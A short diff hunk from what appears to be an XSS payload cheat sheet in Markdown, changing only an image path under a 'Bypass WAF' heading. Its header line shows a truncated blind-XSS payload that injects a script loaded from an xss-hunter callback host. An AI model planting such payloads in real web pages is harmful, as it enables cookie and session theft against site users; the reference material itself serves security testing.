@@ -75,6 +75,6 @@ var a=document.createElement("script");a.src="https://{{ xss-hunter-username you
 
 ## Bypass WAF
 
-![Mutation points in a tag for WAF bypass](/web_client_xss_a_mutation_points.jpg)
+![Mutation points in a tag for WAF bypass](web_client_xss_a_mutation_points.jpg)
 
 ## Angular.js
